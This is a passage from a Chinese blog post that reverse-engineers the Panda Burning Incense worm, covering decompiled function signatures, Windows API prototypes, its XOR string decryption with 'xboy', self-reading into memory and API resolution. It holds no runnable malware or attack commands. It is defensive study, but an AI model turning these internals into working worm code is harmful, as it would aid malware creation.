sub_4041FC@&lt;eax&gt;(<span class="type">char</span> **a1@&lt;eax&gt;, <span class="type">int</span> a2@&lt;edx&gt;, <span class="type">int</span> a3@&lt;ecx&gt;)</span><br></pre></td></tr></table></figure><p>eax中存的内容是ecx的值的地址。进去发现有4个子函数：<code>sub_402560()</code>、<code>sub_403D08()</code>、<code>sub_402650()</code>、<code>sub_403C44()</code>。后面三个前面已经分析过了，分别是分配一定大小的内存空间、字符串拷贝、初始化寄存器。</p><p>现在看<code>sub_402560()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__usercall sub_402560@&lt;eax&gt;(_DWORD *result@&lt;eax&gt;, <span class="type">int</span> a2@&lt;edx&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/5.2.13.png" class="" title="sub_402560()函数分析"><p>进去里面发现又是对临界资源的操作，可以不管，回到父函数<code>sub_403ED4()</code>。</p><p>下面这个call又调用了<code>sub_402650()</code>字符串拷贝函数。</p><img src="/posts/a48809a5/5.2.14.png" class="" title="sub_403ED4()函数分析"><p>在循环处下多几个断点，查看在循环的过程中地址B10068附近数据的变化。</p><img src="/posts/a48809a5/5.2.15.png" class="" title="循环分析"><p>发现在地址40CC94的那一串字符与“xboy”异或后变成“武汉男生感染下载者”，存在了地址B10088中。</p><h3 id="5-2-3-sub-403C98"><a href="#5-2-3-sub-403C98" class="headerlink" title="5.2.3 sub_403C98"></a>5.2.3 sub_403C98</h3><p>是5.1分析过的函数，不再赘述。</p><h3 id="5-2-4-sub-403C68"><a href="#5-2-4-sub-403C68" class="headerlink" title="5.2.4 sub_403C68"></a>5.2.4 sub_403C68</h3><p>也是进行了一些原子操作，不用管。</p><h3 id="5-2-5-总结"><a href="#5-2-5-总结" class="headerlink" title="5.2.5 总结"></a>5.2.5 总结</h3><p>这个函数最主要部分就是循环，“xboy”与那奇怪的字符串异或后变成“武汉男生感染下载者”，说明进行了解密，不妨将<code>sub_405360()</code>函数更名为<code>DecodeString()</code>。</p><h2 id="5-3-sub-404018函数分析"><a href="#5-3-sub-404018函数分析" class="headerlink" title="5.3 sub_404018函数分析"></a>5.3 sub_404018函数分析</h2><p>这个函数也是用户自定义调用约定，第一个参数存入eax，第二个参数存入edx，返回值存入eax。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __usercall sub_404018@&lt;eax&gt;(<span class="type">int</span> result@&lt;eax&gt;, <span class="type">int</span> a2@&lt;edx&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/5.3.1.png" class="" title="sub_404018()函数分析"><img src="/posts/a48809a5/5.3.2.png" class="" title="sub_404018()函数分析"><p>结合来看，不难猜测这个函数的功能是字符串比较。将该函数更名为<code>CMPString()</code>。</p><p>至此，病毒的初始化全过程已经进入尾声了。不得不说，分析样本真的好累啊，分析了两天才分析完样本的初始化。接下来分析紧接着的三个函数是熊猫烧香病毒最重要的功能。</p><h1 id="6-动静结合分析样本——病毒释放机理"><a href="#6-动静结合分析样本——病毒释放机理" class="headerlink" title="6. 动静结合分析样本——病毒释放机理"></a>6. 动静结合分析样本——病毒释放机理</h1><p>继续看主函数的<code>sub_408024()</code>、<code>sub_40CA5C()</code>、<code>sub_40C97C()</code>，这三个是熊猫烧香的核心函数。</p><h2 id="6-1-sub-408024函数分析"><a href="#6-1-sub-408024函数分析" class="headerlink" title="6.1 sub_408024函数分析"></a>6.1 sub_408024函数分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __thiscall <span class="title function_">sub_408024</span><span class="params">(<span class="type">void</span> *this)</span></span><br></pre></td></tr></table></figure><p><code>__thiscall</code>的主要特征是：</p><ul><li>由被调用者清除堆栈</li><li>参数从右往左依次入栈</li><li>this指针通过ECX传递，而不是用栈</li></ul><p>在这个函数中，有非常多的子函数，接下来逐一分析。</p><h3 id="6-1-1-sub-40277C"><a href="#6-1-1-sub-40277C" class="headerlink" title="6.1.1 sub_40277C"></a>6.1.1 sub_40277C</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __usercall sub_40277C@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;, _DWORD *a2@&lt;edx&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.1.png" class="" title="sub_40277C()函数分析"><img src="/posts/a48809a5/6.1.2.png" class="" title="sub_40277C()函数分析"><p><code>sub_40277C()</code>函数中有两个API函数：<code>GetModuleFileName()</code>和<code>GetCommandLine()</code>。</p><p><code>GetModuleFileName()</code>的功能是获取当前进程已加载模块的文件的完整路径，该模块必须由当前进程加载。如果想要获取另一个已加载模块的文件路径，可以使用<code>GetModuleFileNameEx()</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DWORD WINAPI <span class="title function_">GetModuleFileName</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_opt_  HMODULE hModule,</span></span><br><span class="line"><span class="params">    _Out_     LPTSTR lpFilename,</span></span><br><span class="line"><span class="params">    _In_      DWORD nSize</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>hModule：Long类型，一个模块的句柄。可以是一个DLL模块，或者是一个应用程序的实例句柄。如果该参数为NULL，该函数返回该应用程序全路径。</li><li>lpFileName：String类型，指定一个字串缓冲区，要在其中容纳文件的用NULL字符中止的路径名，<code>hModule</code>模块就是从这个文件装载进来的。</li><li>nSize：Long类型，装载到缓冲区<code>lpFileName</code>的最大字符数量。</li></ul><p>返回值：Long，如执行成功，返回复制到<code>lpFileName</code>的实际字符数量；零表示失败。使用<code>GetLastError()</code>可以打印错误信息。</p><p><code>GetCommandLine()</code>的功能是获得指向当前命令行缓冲区的一个指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LPTSTR <span class="title function_">GetCommandLine</span><span class="params">(<span class="type">void</span>)</span>;</span><br></pre></td></tr></table></figure><p>无参数，返回值是一个指向当前进程的命令行字符串的指针。</p><p>当执行完<code>GetModuleFileName()</code>函数后，在数据窗口可以看到该程序的绝对路径，并且绕过了<code>GetCommandLine()</code>。根据地址402792那一行的jnz跳转指令可知，<code>sub_40277C()</code>的功能是要么获取当前程序绝对路径，要么获取当前命令行缓冲区的指针。</p><img src="/posts/a48809a5/6.1.3.png" class="" title="sub_40277C()函数分析"><p>将该函数重命名为<code>GetFilePathAndName()</code>。</p><h3 id="6-1-2-sub-405684"><a href="#6-1-2-sub-405684" class="headerlink" title="6.1.2 sub_405684"></a>6.1.2 sub_405684</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__usercall sub_405684@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;, <span class="type">int</span> a2@&lt;edx&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.4.png" class="" title="sub_405684()函数分析"><p>进入<code>sub_405684()</code>函数，发现一个小循环，遇到斜杠、反斜杠或冒号则跳出循环。它的目的要么是想不包含病毒文件名的路径，要么想获取样本的名字。</p><img src="/posts/a48809a5/6.1.5.png" class="" title="sub_405684()函数分析"><p>来到地址4056D8时，这三个寄存器存的值的含义如下：</p><p>EAX存的是绝对路径；ECX存的是在绝对路径中程序名的索引值；EDX被置为1，暂时不知道有什么含义。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__userpurge sub_40412C@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;, <span class="type">int</span> a2@&lt;edx&gt;, <span class="type">int</span> a3@&lt;ecx&gt;, _DWORD *a4)</span><br></pre></td></tr></table></figure><p><code>__userpurge</code>和<code>__usercall</code>一样，都是用户自定义函数调用约定，唯一的区别是<code>__userpurge</code>表示<strong>由被调用者清理堆栈</strong>。</p><p>进入<code>sub_40412C()</code>函数，有两个子函数分别是<code>sub_403D34()</code>和<code>sub_403C44()</code>，这两个函数前面都有分析过，<code>sub_403D34()</code>分配一定大小的内存空间，进行字符串拷贝。<code>sub_403C44()</code>初始化寄存器。</p><img src="/posts/a48809a5/6.1.6.png" class="" title="sub_40412C()函数分析"><p>发现<code>sub_405684()</code>其实是想获取不包含病毒文件名的路径，将它更名为<code>GetFilePath()</code>。</p><h4 id="6-1-2-1-局部变量"><a href="#6-1-2-1-局部变量" class="headerlink" title="6.1.2.1 局部变量"></a>6.1.2.1 局部变量</h4><p>在<code>sub_405684()</code>函数里，可以看到一些局部变量。比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0040568C  |.  8945 FC       mov [local.1],eax</span><br><span class="line">0040568F  |.  8B45 FC       mov eax,[local.1]</span><br></pre></td></tr></table></figure><p>[local.1]表示第一个局部变量，存放在栈里的[ebp-4]的位置。</p><img src="/posts/a48809a5/6.1.7.png" class="" title="sub_405684()函数分析"><p>以此类推，[local.2]存放在[ebp-8]的位置。</p><p>如果想让它直接显示与ebp的偏移，可在选项 -&gt; 调试设置 -&gt; 分析1 -&gt; 取消勾选“显示函数中的参数及局部变量”。或者选中相应行，按空格键查看汇编代码。</p><img src="/posts/a48809a5/6.1.8.png" class=""><h3 id="6-1-3-sub-403ED4"><a href="#6-1-3-sub-403ED4" class="headerlink" title="6.1.3 sub_403ED4"></a>6.1.3 sub_403ED4</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> **__usercall sub_403ED4@&lt;eax&gt;(<span class="type">char</span> **result@&lt;eax&gt;, <span class="type">char</span> *a2@&lt;edx&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.9.png" class="" title="sub_403ED4()函数分析"><p>这个函数在5.2.2.2也分析过，但当时只是初始化，了解得很笼统。但结合实例很容易分析出来这是一个字符串拼接函数。</p><img src="/posts/a48809a5/6.1.10.png" class="" title="sub_403ED4()函数分析"><p>将<code>sub_403ED4()</code>更名为<code>StringCat()</code>。</p><h3 id="6-1-4-sub-4057A4"><a href="#6-1-4-sub-4057A4" class="headerlink" title="6.1.4 sub_4057A4"></a>6.1.4 sub_4057A4</h3><p>进入无需传参的<code>sub_4057A4()</code>，有一个子函数<code>sub_40573C()</code>也无需传参，继续进入，发现有4个API函数。</p><p><code>FindFirstFile()</code>查找指定目录的第一个文件或目录并返回它的句柄。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HANDLE <span class="title function_">FindFirstFileA</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]  LPCSTR             lpFileName,</span></span><br><span class="line"><span class="params">  [out] LPWIN32_FIND_DATA  lpFindFileData</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>lpFileName：指向字符串的指针，用于指定一个有效的目录。</li><li>lpFindFileData：指向一个<code>WIN32_FIND_DATA</code>的指针，用于存放找到文件或目录的信息。</li></ul><p>返回值：</p><ul><li>如果成功，则返回找到文件或目录的句柄。在<code>FindNextFile()</code>和<code>FindClose()</code>函数中会用到此句柄。</li><li>如果失败，返回<code>INVALID_HANDLE_VALUE</code>。要获得更多的信息调用<code>GetLastError()</code>函数。</li></ul><p><code>FindClose()</code>用于关闭由<code>FindFirstFile()</code>函数创建的一个搜索句柄。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">FindClose</span><span class="params">(</span></span><br><span class="line"><span class="params">    HANDLE hFindFile <span class="comment">// file search handle</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>hFindFile：<code>FindFirstFile()</code>创建的句柄。</li></ul><p>返回值：</p><ul><li>调用成功，返回一个非0值。</li><li>失败，返回0，可利用<code>GetLastError()</code>来得到错误信息。</li></ul><p><code>FileTimeToLocalFileTime()</code>将一个FILETIME结构转换成本地时间。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">FileTimeToLocalFileTime</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]  <span class="type">const</span> FILETIME* lpFileTime,</span></span><br><span class="line"><span class="params">  [out] LPFILETIME lpLocalFileTime</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>lpFileTime：指向FILETIME结构，其中包含要转换为本地文件时间的基于UTC的文件时间。</li><li>lpLocalFileTime：指向FILETIME结构的指针，以接收转换后的本地文件时间。</li></ul><p>返回值：非0表示成功，0表示失败。</p><p><code>FileTimeToDosDateTime()</code>将一个 FILETIME 值转换成 MS-DOS 日期和时间值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">FileTimeToDosDateTime</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]  <span class="type">const</span> FILETIME *lpFileTime,</span></span><br><span class="line"><span class="params">  [out] LPWORD         lpFatDate,</span></span><br><span class="line"><span class="params">  [out] LPWORD         lpFatTime</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li><p>lpFileTime：指向 FILETIME 结构的指针，其中包含要转换为 MS-DOS 日期和时间格式的文件时间。</p></li><li><p>lpFatDate：指向接收MS-DOS日期的变量的指针。日期是以下格式的压缩值。</p><p>| 比特 | 说明                                                |<br>| —— | —————————————————————————- |<br>| 0-4  | Day of the month (1–31)                             |<br>| 5-8  | Month (1 = January, 2 = February, etc.)             |<br>| 9-15 | Year offset from 1980 (add 1980 to get actual year) |</p></li><li><p>lpFatTime：指向接收MS-DOS时间的变量的指针。时间是以下格式的压缩值。</p><p>| 比特 | 说明                           |<br>| —— | ——————————————— |<br>| 0-4  | 秒除以2                        |<br>| 5-8  | Minute (0–59)                  |<br>| 9-15 | Hour (0–23 on a 24-hour clock) |</p></li></ul><p>返回值：非0表示成功，0表示失败。</p><p>这就很好懂啦，整个<code>sub_4057A4()</code>做的就是某个检查文件是否存在当前目录，如果存在则转换成文件的本地时间和DOS日期。将它更名为<code>CheckFileExist()</code>。</p><h3 id="6-1-5-sub-4078E0"><a href="#6-1-5-sub-4078E0" class="headerlink" title="6.1.5 sub_4078E0"></a>6.1.5 sub_4078E0</h3><p>由于当前没有<code>Desktop_.ini</code>文件，所以下面的一系列call也都被跳过了。我们先跟着流程跳过，稍后回来到这里再分析它们。</p><img src="/posts/a48809a5/6.1.11.png" class="" title="sub_408024()函数分析"><p>再次调用<code>sub_40277C()</code>，也就是<code>GetFilePathAndName()</code>后，调用<code>sub_4078E0()</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__usercall sub_4078E0@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;, <span class="type">char</span> **a2@&lt;edx&gt;, <span class="type">int</span> a3@&lt;ebx&gt;, <span class="type">int</span> a4@&lt;edi&gt;, <span class="type">int</span> a5@&lt;esi&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.12.png" class="" title="sub_4078E0()函数分析"><h4 id="6-1-5-1-sub-402EB8"><a href="#6-1-5-1-sub-402EB8" class="headerlink" title="6.1.5.1 sub_402EB8"></a>6.1.5.1 sub_402EB8</h4><p>进去到<code>sub_402EB8()</code>后只有一个函数<code>sub_402DD8()</code>。进去发现又是API函数。</p><p><code>CreateFile()</code>创建或打开文件，<code>GetStdHandle()</code>获取句柄，<code>GetLastError()</code>收集错误信息。</p><img src="/posts/a48809a5/6.1.13.png" class="" title="sub_402DD8()函数分析"><p>发现它打开了它自己<code>setup.exe</code>。</p><h4 id="6-1-5-2-sub-402614"><a href="#6-1-5-2-sub-402614" class="headerlink" title="6.1.5.2 sub_402614"></a>6.1.5.2 sub_402614</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __thiscall __spoils&lt;ecx&gt; <span class="title function_">sub_402614</span><span class="params">(<span class="type">void</span> *this)</span></span><br></pre></td></tr></table></figure><p>如果使用<code>__spoils</code>关键字，指定的列表将覆盖标准的破坏列表。对于x86，标准的破坏列表是<eax, edx, ecx>，破坏列表也可以为空。</p><p>进入该函数里面只有一个函数<code>sub_40499C()</code>，里面只有一个API函数<code>TlsGetValue()</code>，该API函数的作用是检索调用线程的线程本地存储(TLS)槽中指定 TLS 索引的值。进程的每个线程对于每个 TLS 索引都有自己的槽。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LPVOID <span class="title function_">TlsGetValue</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] DWORD dwTlsIndex</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>dwTlsIndex：由<code>TlsAlloc()</code>函数分配的TLS索引。</li></ul><p>返回值：</p><ul><li>如果函数成功，则返回值是存储在与指定索引关联的调用线程TLS插槽中的值。如果<code>dwTlsIndex</code>是成功调用<code>TlsAlloc()</code>分配的有效索引，则此函数始终成功。</li><li>如果函数失败，则返回值为零。要获取扩展的错误信息，请调用<code>GetLastError()</code>。</li></ul><p>当然这个API函数基本上都被跳过了，因为前面都没有用到<code>TlsAlloc()</code>函数。</p><h4 id="6-1-5-3-sub-402D28"><a href="#6-1-5-3-sub-402D28" class="headerlink" title="6.1.5.3 sub_402D28"></a>6.1.5.3 sub_402D28</h4><p>里面有个API函数<code>GetFileSize()</code>用来获取文件大小。文件大小为0xEC00。</p><img src="/posts/a48809a5/6.1.21.png" class="" title="sub_402D28()函数分析"><h4 id="6-1-5-4-sub-402CBC"><a href="#6-1-5-4-sub-402CBC" class="headerlink" title="6.1.5.4 sub_402CBC"></a>6.1.5.4 sub_402CBC</h4><p>里面有两个函数：<code>sub_402CD8()</code>和<code>sub_402D28()</code>。后者已经在上面分析过了。<code>sub_402CD8()</code>里有个API函数<code>SetFilePointer()</code>，用来设置文件指针。</p><h4 id="6-1-5-5-sub-402C28"><a href="#6-1-5-5-sub-402C28" class="headerlink" title="6.1.5.5 sub_402C28"></a>6.1.5.5 sub_402C28</h4><p>在这个函数里面，可以看到将<code>ReadFile()</code>函数入栈，调用<code>sub_402B9C()</code>。</p><img src="/posts/a48809a5/6.1.14.png" class="" title="sub_402C28()函数分析"><p>进入<code>sub_402B9C()</code>，执行<code>ReadFile()</code>函数。这里的[arg.2]表示[ebp+0xC]。</p><img src="/posts/a48809a5/6.1.15.png" class="" title="sub_402C28()函数分析"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">ReadFile</span><span class="params">(</span></span><br><span class="line"><span class="params">    HANDLE hFile,            <span class="comment">//文件的句柄</span></span></span><br><span class="line"><span class="params">    LPVOID lpBuffer,          <span class="comment">//用于保存读入数据的一个缓冲区</span></span></span><br><span class="line"><span class="params">    DWORD nNumberOfBytesToRead,    <span class="comment">//要读入的字节数</span></span></span><br><span class="line"><span class="params">    LPDWORD lpNumberOfBytesRead,    <span class="comment">//指向实际读取字节数的指针</span></span></span><br><span class="line"><span class="params">    LPOVERLAPPED lpOverlapped</span></span><br><span class="line"><span class="params">    <span class="comment">//如文件打开时指定了FILE_FLAG_OVERLAPPED，那么必须，用这个参数引用一个特殊的结构。</span></span></span><br><span class="line"><span class="params">    <span class="comment">//该结构定义了一次异步读取操作。否则，应将这个参数设为NULL</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>可以看到它将自己读到了内存中去。</p><img src="/posts/a48809a5/6.1.16.png" class="" title="sub_402C28()函数分析"><h4 id="6-1-5-6-sub-403D34、sub-403ED4和sub-402CBC"><a href="#6-1-5-6-sub-403D34、sub-403ED4和sub-402CBC" class="headerlink" title="6.1.5.6 sub_403D34、sub_403ED4和sub_402CBC"></a>6.1.5.6 sub_403D34、sub_403ED4和sub_402CBC</h4><p>这三个函数上面都有分析过，<code>sub_403D34()</code>是<code>StringCopy()</code>，<code>sub_403ED4()</code>是<code>StringCat()</code>，<code>sub_402CBC()</code>设置文件指针。</p><p>发现这是一个循环，在跳转处下断点，关注数据窗口发现有哪些数据被修改了。</p><img src="/posts/a48809a5/6.1.17.png" class="" title="循环分析"><p>第一次，将自己一部分写入到内存中：</p><img src="/posts/a48809a5/6.1.18.png" class="" title="循环分析"><p>第二次，继续将自己一部分写入到内存中：</p><img src="/posts/a48809a5/6.1.19.png" class="" title="循环分析"><p>第三次，将剩下的部分写入到内存中：</p><img src="/posts/a48809a5/6.1.20.png" class="" title="循环分析"><p>结合循环中的汇编代码分析，文件大小为0xEC00，每次读取0x5000进行拷贝和拼接，所以这个循环是将自身读到内存中去。</p><p>其中，我们可以看到一些“1234”等等的字符串，那是病毒作者将爆破字典也写入到了病毒里面，企图利用暴力破解的方式来攻破计算机中的某些验证机制。</p><h4 id="6-1-5-7-sub-402C48"><a href="#6-1-5-7-sub-402C48" class="headerlink" title="6.1.5.7 sub_402C48"></a>6.1.5.7 sub_402C48</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __usercall sub_402C48@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.22.png" class="" title="sub_402C48()函数分析"><p>进入后，继续进入<code>sub_402DB0()</code>，继续进入<code>sub_4028FC()</code>，里面有个<code>CloseHandle()</code>函数，用来关闭我们刚才打开的程序。其它函数都不太重要，不用在意。</p><h4 id="6-1-5-8-sub-403ECC、sub-40412C和sub-403C44"><a href="#6-1-5-8-sub-403ECC、sub-40412C和sub-403C44" class="headerlink" title="6.1.5.8 sub_403ECC、sub_40412C和sub_403C44"></a>6.1.5.8 sub_403ECC、sub_40412C和sub_403C44</h4><p><code>sub_403ECC()</code>函数是求字符串长度的，在这里是求三次循环后复制的字符串长度，应该为0xF000。执行完这个函数后，与文件大小0xEC00相比，跳转未实现，需要进入<code>sub_40412C()</code>函数。</p><img src="/posts/a48809a5/6.1.23.png" class="" title="sub_403ECC()函数分析"><p><code>sub_40412C()</code>函数我们也分析过，它里面有个函数是<code>StringCopy()</code>。</p><img src="/posts/a48809a5/6.1.24.png" class="" title="sub_40412C()函数分析"><p><code>sub_403C44()</code>也分析过，初始化寄存器。</p><img src="/posts/a48809a5/6.1.25.png" class="" title="sub_403C44()函数分析"><h4 id="6-1-5-9-总结"><a href="#6-1-5-9-总结" class="headerlink" title="6.1.5.9 总结"></a>6.1.5.9 总结</h4><p>至此，<code>sub_4078E0()</code>就全分析完了，样本将自己读取到内存上，是因为样本中有爆破字典，企图利用暴力破解的方式来攻破计算机中的某些验证机制。</p><p>将该函数更名为<code>WriteVirusInfoToMem()</code>。</p><h3 id="6-1-6-sub-40532C"><a href="#6-1-6-sub-40532C" class="headerlink" title="6.1.6 sub_40532C"></a>6.1.6 sub_40532C</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DWORD __usercall sub_40532C@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;, <span class="type">char</span> **a2@&lt;edx&gt;)</span><br></pre></td></tr></table></figure><p><code>sub_403ECC()</code>求文件绝对路径的长度，<code>sub_403D34()</code>是<code>StringCopy()</code>，还有个API函数，<code>CharUpperBuff()</code>表示将字符串中的小写字母全都转化为大写字母。</p><img src="/posts/a48809a5/6.1.26.png" class="" title="sub_40532C()函数分析"><p>所以这个函数的功能是将文件路径改为大写字母，更名为<code>UpperFilePath()</code>。</p><h3 id="6-1-7-sub-4054BC"><a href="#6-1-7-sub-4054BC" class="headerlink" title="6.1.7 sub_4054BC"></a>6.1.7 sub_4054BC</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> **__usercall sub_4054BC@&lt;eax&gt;(<span class="type">int</span> *a1@&lt;eax&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.27.png" class="" title="sub_4054BC()函数分析"><p>这里有个API函数<code>GetSystemDirectoryA()</code>，原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UINT WINAPI <span class="title function_">GetSystemDirectory</span><span class="params">(</span></span><br><span class="line"><span class="params">    __out LPTSTR lpBuffer,</span></span><br><span class="line"><span class="params">    __in UINT uSize</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>lpBuffer：用于装载系统目录路径名的一个字串缓冲区。</li><li>uSize：lpBuffer字串的最大长度。</li></ul><p>返回值：装载到lpBuffer缓冲区的字符数量。如lpBuffer不够大，不能容下文件名，则返回要求的缓冲区长度。</p><p>它的作用是获得系统目录<code>C:\WINDOWS\system32</code>，同时也是这个函数的主要功能。将它更名为<code>GetSystemDirectory()</code>。</p><h3 id="6-1-8-sub-403F8C"><a href="#6-1-8-sub-403F8C" class="headerlink" title="6.1.8 sub_403F8C"></a>6.1.8 sub_403F8C</h3><img src="/posts/a48809a5/6.1.28.png" class="" title="sub_403F8C()函数分析"><p>从IDA中可以很容易理解<code>sub_403F8C()</code>函数的作用，也就是将这三个字符串拼接成路径的地址存到v8当中。</p><p>为了验证猜想，在OD中步过<code>sub_403F8C()</code>试试。</p><img src="/posts/a48809a5/6.1.29.png" class="" title="sub_403F8C()函数分析"><img src="/posts/a48809a5/6.1.30.png" class="" title="sub_403F8C()函数分析"><img src="/posts/a48809a5/6.1.31.png" class="" title="sub_403F8C()函数分析"><p>所以这个函数也可以看成是字符串拼接函数，它是从后往前拼接的，更名为<code>ReverseStringCat()</code>。</p><h3 id="6-1-9-sub-4060D4"><a href="#6-1-9-sub-4060D4" class="headerlink" title="6.1.9 sub_4060D4"></a>6.1.9 sub_4060D4</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__usercall sub_4060D4@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;)</span><br></pre></td></tr></table></figure><img src="/posts/a48809a5/6.1.32.png" class="" title="sub_4060D4()函数分析"><h4 id="6-1-9-1-sub-405028"><a href="#6-1-9-1-sub-405028" class="headerlink" title="6.1.9.1 sub_405028"></a>6.1.9.1 sub_405028</h4><p>进入函数内部，进入<code>sub_405028()</code>，再进入<code>sub_404DAC()</code>，看到一连串的API函数。</p><img src="/posts/a48809a5/6.1.33.png" class="" title="sub_404DAC()函数分析"><p>使用<code>GetModuleHandleA()</code>获取<code>kernel32.dll</code>的句柄，再利用<code>kernel32.dll</code>中的<code>GetProcAddress()</code>函数获取所需要的API函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FARPROC <span class="title function_">GetProcAddress</span><span class="params">(</span></span><br><span class="line"><span class="params">    HMODULE hModule, <span class="comment">// DLL模块句柄</span></span></span><br><span class="line"><span class="params">    LPCSTR lpProcName <span class="comment">// 函数名</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>hModule：[in] 包含此函数的DLL模块的句柄。<code>LoadLibrary()</code>、<code>AfxLoadLibrary()</code>或者<code>GetModuleHandle()</code>函数可以返回此句柄。</li><li>lpProcName：[in] 包含函数名的以NULL结尾的字符串，或者指定函数的序数值。如果此参数是一个序数值，它必须在低字，高字必须为0。</li></ul><p>返回值：</p><ul><li>如果函数调用成功，返回值是DLL中的输出函数地址。</li><li>如果函数调用失败，返回值是NULL。得到进一步的错误信息，调用函数GetLastError。</li></ul><p>可以看到它调用了非常多的API函数，各API函数的功能如下：</p><div 